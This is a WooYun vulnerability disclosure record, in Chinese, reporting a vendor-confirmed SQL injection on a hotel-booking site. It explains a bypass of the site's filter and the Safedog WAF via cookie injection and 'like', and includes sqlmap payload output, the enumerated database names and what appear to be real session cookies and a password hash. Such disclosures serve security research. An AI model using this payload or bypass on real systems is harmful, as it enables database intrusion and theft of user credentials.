{"id": 41306, "wybug_id": "wooyun-2015-0104327", "wybug_title": "看我如何绕过多重防注入进行住哪网注入", "wybug_corp": "住哪网", "wybug_author": "greg.wu", "wybug_date": "2015-03-28 10:09", "wybug_open_date": "2015-05-13 14:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入绕过技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-04-08：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-18：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-28：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-13：\t细节向公众公开  简要描述： 绕过程序本身的代码防注入和安全狗 详细说明：  问题站点：union.zhuna.cn注入点：http://union.zhuna.cn/user/ajaxarea.asp?Id=6&TypeID=CityID参数id，mssql 数字型注入经过测试，网站自身程序有防注入功能，输入单引号 and or 等关键字会报错，如下图\n\n因为是asp程序，考虑将get请求转变为post请求以绕过防注入，发现是可行的，但问题又来了，该站还安装了安全狗\n\n继续测试，猜测asp代码里应该是gpc都能接收参数的，于是将存在注入的参数放到cookie里面，再将等于号换成like，终于完美绕过多重防注入！\n\n   漏洞证明：  放到sqlmap里跑，毫无压力sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Parameter: Cookie #1* ((custom) HEADER)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: ASPSESSIONIDAQBDRBCS=LBCFGGDCJJDNBFBKAFJLDJAO; S0Oz_20eb_saltkey=dpzTu77i; S0Oz_20eb_lastvisit=1427459395; S0Oz_20eb_sid=x711zC; pgv_pvi=6822079425; pgv_info=ssi=s1363428688; Referer=http://union.zhuna.cn/; login=login; ZhuNaUserName=15017512337; ZhuNaUserID=7170608; ZhuNaPassWord=ea3f2951e30f0584; S0Oz_20eb_lastact=1427466253\tapi.php\tjs; safedog-flow-item=073B67548420D14D0CC822F81DD5EA5E; tjid=; webname=baiii; sxid=; AJSTAT_ok_pages=21; AJSTAT_ok_times=1; Id=6 ) AND 4752=4752 AND (2853=2853---[23:32:56] [WARNING] changes made by tampering scripts are not included in shown payload content(s)[23:32:56] [INFO] testing Microsoft SQL Server[23:32:56] [INFO] confirming Microsoft SQL Server[23:32:56] [INFO] the back-end DBMS is Microsoft SQL Serverweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0back-end DBMS: Microsoft SQL Server 2008[23:32:56] [INFO] fetching database names[23:32:56] [INFO] fetching number of databases[23:32:56] [INFO] resumed: 8available databases [8]:[*] global_hotel[*] hotel_9tour_cn[*] master[*] model[*] msdb[*] tempdb[*] www_zhuna_cn_jipiao[*] www_zhuna_cn_yufu2目测数据还挺多的~   修复方案：  赶紧修复吧   版权声明：转载请注明来源 greg.wu@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-03-29 14:17 厂商回复： 非常感谢您反馈的信息，相关问题已交技术处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-28 10:49 |    \t\tgreg.wu \t\t\t( 普通白帽子  |\t\t\t        Rank:815 漏洞数:99        | 打酱油的~)\t\t \n  管理同学把标题改的好中二。。。    \n     2015-03-28 11:44 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:882 漏洞数:157        | 收wb 1：5 无限量收 [平台担保]))\t\t \n  我和我的小伙伴都惊呆了。    \n     2015-05-13 14:39 |    \t\tmyhalo \t\t\t( 普通白帽子  |\t\t\t        Rank:281 漏洞数:55        | 所属团队:TSafe)\t\t \n  骚年，怎么这么机智。    \n     2015-05-13 15:09 |    \t\t圣路西法 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 围观大神ส็็็็็็ ̷̸̨̀͒̏̃ͦ...)\t\t \n  骚年好猥琐啊。    \n     2015-05-13 15:24 |    \t\t小博博 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:9        | .)\t\t \n  骚年 好机智     \n     2015-05-13 15:46 |    \t\t美囤妈妈(乌云厂商)\t\t \n  新厂商入驻，欢迎各位白帽子光临！同时我们招聘安全主管，有兴趣的联系我！    \n     2015-05-13 16:19 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:182 漏洞数:23        | 开发真是日了狗了)\t\t \n  安全狗对HPP还是无法防御吗    \n     2015-05-13 16:26 |    \t\t胡小树 \t\t\t( 实习白帽子  |\t\t\t        Rank:60 漏洞数:11        | 我是一颗小小树)\t\t \n  不错哦思路赞    \n     2015-05-13 19:02 |    \t\tKeen \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | ...)\t\t \n  吊炸天啊    \n     2015-05-13 21:36 |    \t\tSoulmk \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:2        | 我是来学习滴~~)\t\t \n  好思路，学习了~~~谢谢    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}